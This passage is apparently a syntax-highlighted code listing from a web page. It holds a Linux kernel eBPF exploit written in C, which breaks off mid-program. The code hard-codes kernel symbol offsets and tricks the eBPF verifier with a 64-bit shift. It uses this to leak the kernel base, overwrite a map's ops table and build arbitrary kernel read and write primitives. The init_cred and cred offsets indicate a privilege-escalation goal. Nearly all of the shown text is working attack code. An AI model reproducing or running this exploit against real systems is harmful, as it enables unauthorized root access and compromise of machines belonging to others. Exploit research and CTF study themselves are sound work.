class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bpf_insn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_MAP_OPS_OFFSET 0x10363a0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_MAP_LOOKUP_ELEM_OFFSET 0x20e830</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_MAP_UPDATE_ELEM_OFFSET 0x20eeb0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PERCPU_OFFSET 0x149c900</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> current_task 0x17bc0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED_OFFSET 0x1a6b880</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_OFFSET 0xad8</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> oob_map_fd, arb_read_write_map_fd, info_map_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd,<span class="keyword">union</span> bpf_attr *attr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="keyword">sizeof</span>(*attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog_load</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_LOAD,attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> bpf_attr* <span class="title function_">creat_bpf_prog</span><span class="params">(<span class="keyword">struct</span> bpf_insn *insns,<span class="type">unsigned</span> <span class="type">int</span> insn_cnt)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span>* <span class="title">attr</span>=</span>(<span class="keyword">union</span> bpf_attr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">union</span> bpf_attr));</span><br><span class="line"></span><br><span class="line">    attr-&gt;prog_type=BPF_PROG_TYPE_SOCKET_FILTER;</span><br><span class="line">    attr-&gt;insn_cnt=insn_cnt;</span><br><span class="line">    attr-&gt;insns=(<span class="type">uint64_t</span>)insns;</span><br><span class="line">    attr-&gt;license=(<span class="type">uint64_t</span>)<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> attr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">attach_socket</span><span class="params">(<span class="type">int</span> prog_fd)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(socks[<span class="number">0</span>]==<span class="number">-1</span>&amp;&amp;socketpair(AF_UNIX,SOCK_DGRAM,<span class="number">0</span>,socks)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_bpf_prog</span><span class="params">(<span class="keyword">struct</span> bpf_insn* insns,uint insncnt)</span>&#123;</span><br><span class="line">    <span class="type">char</span> log_buffer[<span class="number">0x4000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> *<span class="title">prog</span>=</span>creat_bpf_prog(insns,insncnt);</span><br><span class="line"></span><br><span class="line">    prog-&gt;log_level=<span class="number">2</span>;</span><br><span class="line">    prog-&gt;log_buf=(<span class="type">uint64_t</span>)log_buffer;</span><br><span class="line">    prog-&gt;log_size=<span class="keyword">sizeof</span>(log_buffer);</span><br><span class="line">    <span class="built_in">strncpy</span>(prog-&gt;prog_name, <span class="string">&quot;stdnoerr&quot;</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> prog_fd=bpf_prog_load(prog);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">strlen</span>(log_buffer));</span><br><span class="line">    <span class="built_in">puts</span>(log_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(prog_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;prog_load&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    attach_socket(prog_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run_bpf_prog</span><span class="params">(<span class="keyword">struct</span> bpf_insn *insns,uint insncnt)</span>&#123;</span><br><span class="line">    <span class="type">int</span> val=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    setup_bpf_prog(insns,insncnt);</span><br><span class="line">    write(socks[<span class="number">1</span>],&amp;val,<span class="keyword">sizeof</span>(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_map_create</span><span class="params">(<span class="type">uint32_t</span> key_size,<span class="type">uint32_t</span> value_size,<span class="type">uint32_t</span> max_entries)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span>=</span>&#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE,&amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_map_update_elem</span><span class="params">(<span class="type">int</span> map_fd, <span class="type">uint64_t</span> key, <span class="type">uint64_t</span>* value, <span class="type">uint64_t</span> flags)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="type">uint64_t</span>) &amp;key,</span><br><span class="line">        .value = (<span class="type">uint64_t</span>) value,</span><br><span class="line">        .flags = flags</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">bpf_map_lookup_elem</span><span class="params">(<span class="type">int</span> map_fd, <span class="type">uint32_t</span> key, <span class="type">int</span> index)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> value[<span class="number">0x150</span>/<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="type">uint64_t</span>) &amp;key,</span><br><span class="line">        .value = (<span class="type">uint64_t</span>) &amp;value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">    <span class="keyword">return</span> value[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">arb_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="type">int</span> req=<span class="number">0</span>;</span><br><span class="line">    bpf_map_update_elem(arb_read_write_map_fd,<span class="number">0</span>,&amp;addr,BPF_ANY);</span><br><span class="line"></span><br><span class="line">    write(socks[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf_map_lookup_elem(info_map_fd,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">arb_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    <span class="type">int</span> req=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    bpf_map_update_elem(arb_read_write_map_fd,<span class="number">0</span>,&amp;addr,BPF_ANY);</span><br><span class="line">    <span class="comment">//arb_read_write_map value[0]=addr</span></span><br><span class="line">    bpf_map_update_elem(info_map_fd, <span class="number">0</span>, &amp;val, BPF_ANY);</span><br><span class="line">    <span class="comment">//info_map value=arb_read_write_map value[0] , *(value)=*(addr)=val</span></span><br><span class="line"></span><br><span class="line">    write(socks[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf_map_lookup_elem(info_map_fd, <span class="number">0</span>, <span class="number">0</span>) == val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">map_info</span>=</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    oob_map_fd=bpf_map_create(<span class="number">4</span>,<span class="number">0x150</span>,<span class="number">1</span>);</span><br><span class="line">    arb_read_write_map_fd=bpf_map_create(<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>);</span><br><span class="line">    info_map_fd=bpf_map_create(<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(oob_map_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;create_map&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">kleak_prog</span>[]=</span>&#123;</span><br><span class="line">        </span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,<span class="number">0</span>), <span class="comment">// r0=0</span></span><br><span class="line">        BPF_STX_MEM(BPF_W,BPF_REG_10,BPF_REG_0,<span class="number">-4</span>),<span class="comment">//  *(r10-4)=r0=0</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),<span class="comment">// r6=r1</span></span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),<span class="comment">//r1=&amp;oob_map</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<span class="comment">//</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),<span class="comment">//r2=r10-4  *r2=0</span></span><br><span class="line">        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), <span class="comment">// r0=map_lookup(r1,r2)</span></span><br><span class="line">        <span class="comment">// returns map_ptr + 0x110 (offset of .values in bpf_array)</span></span><br><span class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        <span class="comment">// trigger vuln and make eBPF think we are still map_ptr + 0x110</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),<span class="comment">//r7=r0</span></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,<span class="number">0x110</span>),<span class="comment">//r0=0x110</span></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_1,<span class="number">64</span>),<span class="comment">//r1=64</span></span><br><span class="line">        BPF_ALU64_REG(BPF_RSH,BPF_REG_0,BPF_REG_1),<span class="comment">//r0 = r0 &gt;&gt; 64 ,r0 real=0x110,fake=0</span></span><br><span class="line">        BPF_ALU64_REG(BPF_SUB,BPF_REG_7,BPF_REG_0),<span class="comment">//r7-=r0   r7 real=map_ptr  fake=map_ptr+0x110</span></span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, <span class="number">0</span>), <span class="comment">// r8=*(r7) =*(map_ptr)</span></span><br><span class="line">        <span class="comment">//load map_value </span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="number">0xc0</span>),<span class="comment">// r7+=0xc0</span></span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, <span class="number">0</span>), <span class="comment">//r9=*(r7) =*(map_ptr+0xc0)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//write the r8 r9</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="number">0x50</span>), <span class="comment">//r7+=0x50  r7=map_ptr+0x110</span></span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, <span class="number">0</span>),<span class="comment">// *(map_ptr+0x110)=r8  value[0]</span></span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_9, <span class="number">8</span>),<span class="comment">// *(map_ptr+0x118)=r9  value[1]</span></span><br><span class="line"></span><br><span class="line">        BPF_EXIT_INSN()</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    run_bpf_prog(kleak_prog, <span class="keyword">sizeof</span>(kleak_prog)/<span class="keyword">sizeof</span>(kleak_prog[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> array_map_ops = bpf_map_lookup_elem(oob_map_fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">uint64_t</span> map_ptr = bpf_map_lookup_elem(oob_map_fd, <span class="number">0</span>, <span class="number">1</span>) - <span class="number">0xc0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> map_ptr_values = map_ptr + <span class="number">0x110</span>;</span><br><span class="line">    <span class="type">uint64_t</span> kbase = array_map_ops - ARRAY_MAP_OPS_OFFSET;</span><br><span class="line">    <span class="type">uint64_t</span> __per_cpu_offset = kbase + PERCPU_OFFSET;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops: %p\nkbase: %p\nmap_ptr: %p\n&quot;</span>, array_map_ops, kbase, map_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">overwrite_ops</span>[]=</span>&#123;</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_6,BPF_REG_1),<span class="comment">//r6=r1</span></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,<span class="number">0</span>),<span class="comment">//r0=0</span></span><br><span class="line">        BPF_STX_MEM(BPF_W,BPF_REG_10,BPF_REG_0,<span class="number">-4</span>),<span class="comment">// *(r10-4)=r0=0</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2,BPF_REG_10),<span class="comment">// r2=r10</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_2,<span class="number">-4</span>),<span class="comment">// *r2=0</span></span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),</span><br><span class="line">        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),</span><br><span class="line">        <span class="comment">// returns map_ptr + 0x110 (offset of .values in bpf_array)</span></span><br><span class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE,BPF_REG_0,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        <span class="comment">//还原ops表，主要是update，lookup这种会用到的功能，</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_7,BPF_REG_0),<span class="comment">//r7=map_ptr+0x110</span></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,kbase+ARRAY_MAP_UPDATE_ELEM_OFFSET),</span><br><span class="line">        BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,<span class="number">0x60</span>),<span class="comment">//*(r7+0x60)=r0</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,kbase+ARRAY_MAP_LOOKUP_ELEM_OFFSET),</span><br><span class="line">        BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,<span class="number">0x58</span>),<span class="comment">//*(r7+0x58)=r0</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, kbase + <span class="number">0x20e9c0</span>), <span class="comment">// array_of_map_gen_lookup</span></span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, <span class="number">19</span> * <span class="number">8</span>),</span><br><span class="line"></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, kbase + <span class="number">0x20eff0</span>), <span class="comment">// array_map_free</span></span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, <span class="number">3</span> * <span class="number">8</span>),</span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2,BPF_REG_10),<span class="comment">//r2=r10</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),<span class="comment">//*r2=0</span></span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_1,arb_read_write_map_fd),<span class="comment">//r1=arb_read_write_map_fd</span></span><br><span class="line">        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),<span class="comment">//r0 = map_value_ptr = map_ptr + 0x110</span></span><br><span class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), <span class="comment">// r7 = r0</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,<span class="number">0x110</span>),</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_1,<span class="number">64</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_RSH,BPF_REG_0,BPF_REG_1),<span class="comment">//fake r0=0 , real r0=0x110</span></span><br><span class="line">        BPF_ALU64_REG(BPF_SUB,BPF_REG_7,BPF_REG_0),<span class="comment">//r7=map_ptr</span></span><br><span class="line"></span><br><span class="line">        BPF_LD_IMM64(BPF_REG_0, map_ptr_values),</span><br><span class="line"></span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, <span class="number">0</span>),<span class="comment">// *r7=*(map_ptr)=map_ptr + 0x110</span></span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line">    &#125;;</span><br><span class="line">    run_bpf_prog(overwrite_ops, <span class="keyword">sizeof</span>(overwrite_ops)/<span class="keyword">sizeof</span>(overwrite_ops[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] overwrite ops done\n&quot;</span>);</span><br><span class="line">    <span class="comment">// now  arb_read_write_map_ptr.ops = map_ptr+0x110</span></span><br><span class="line">    <span class="comment">// *(ops+0x58)=ARRAY_MAP_LOOKUP_ELEM</span></span><br><span class="line">    <span class="comment">// *(ops+0x60)=ARRAY_MAP_UPDATE_ELEM</span></span><br><span class="line">    <span class="comment">// *(ops+0x18)=array_map_free</span></span><br><span class="line">    <span class="comment">// *(ops+0x8*19)=array_of_map_gen_lookup</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">arb_read_write</span>[] =</span> &#123;</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_6,BPF_REG_1),<span class="comment">//r6=r1</span></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0,<span class="number">0</span>),<span class="comment">//r0=0</span></span><br><span class="line">        BPF_STX_MEM(BPF_W,BPF_REG_10,BPF_REG_0,<span class="number">-4</span>),<span class="comment">// *(r10-4)=r0=0</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2,BPF_REG_10),<span class="comment">// r2=r10</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_2,<span class="number">-4</span>),<span class="comment">// *r2=0</span></span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),<span class="comment">//</span></span><br><span class="line">        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),<span class="comment">//arb_read_write_map_fd </span></span><br><span class="line">        <span class="comment">// call *(ops+0x58) ARRAY_MAP_LOOKUP_ELEM   </span></span><br><span class="line">        <span class="comment">//ret r0 = arb_read_write_map_ptr+0x110 </span></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<span class="comment">// r8=r0=arb_read_write_map_ptr+0x110</span></span><br><span class="line"></span><br><span class="line">        BPF_LD_ABS(BPF_B, <span class="number">0</span>),<span class="comment">// loads a byte from the socket ?</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), <span class="comment">// r9=r0; 0 for read, 1 for write</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2,BPF_REG_10), <span class="comment">//r2=r10</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_2,<span class="number">-4</span>), <span class="comment">// *r2=0</span></span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_1,info_map_fd),</span><br><span class="line">        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),<span class="comment">//info_map_fd</span></span><br><span class="line">        <span class="comment">//  returns r0=info_map_ptr + 0x110 </span></span><br><span class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        BPF_JMP_IMM(BPF_JEQ, BPF_REG_9, <span class="number">1</span>, <span class="number">4</span>),</span><br><span class="line">        <span class="comment">//arb_read  read  from info_map</span></span><br><span class="line">        BPF_LDX_MEM(BPF_DW,BPF_REG_7,BPF_REG_8,<span class="number">0</span>),<span class="comment">//  r7=*(r8+0)=*(arb_read_write_map_ptr+0x110)= read_addr</span></span><br><span class="line">        